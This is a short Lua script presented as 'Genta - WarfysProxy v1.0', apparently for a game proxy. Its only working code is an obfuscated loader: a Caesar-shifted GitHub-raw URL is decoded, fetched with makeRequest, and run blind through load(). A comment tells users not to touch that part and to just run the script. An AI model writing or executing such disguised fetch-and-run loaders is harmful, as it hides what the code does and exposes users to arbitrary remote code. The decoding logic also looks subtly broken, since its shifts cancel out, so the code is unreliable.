-- Genta - WarfysProxy v1.0
 --> author: (discord: warfys#0)


-- contributor <3 
 --> 9mocha


-- [warfys] WENC. 
 --> Don't touch this part of the code at all, just run the script.
local e,n,c={},{},{}e.v1={ "jvvru://tcy.ikvjwdwugteqpvgpv.eqo/ycthfgx/YRT@A-IGPVC/ocuvgt/ockp/crk.nwc",3}function n.s(t,e)local n=0 return(t:gsub("[%a]",function(t)local a=t:byte()return string.char((a>90 and 96 or 64)+(a-(a>90 and 97 or 65)+e)%26)end))end e.v2=n.s(e.v1[1],e.v1[2])function n.d(t,e)return n.s(t,-e)end e.v3=n.d(e.v2,e.v1[2]*01) local t = e.v3:sub(1):gsub("`", "v"):gsub("@", "X") load(makeRequest(t, "GET").content)()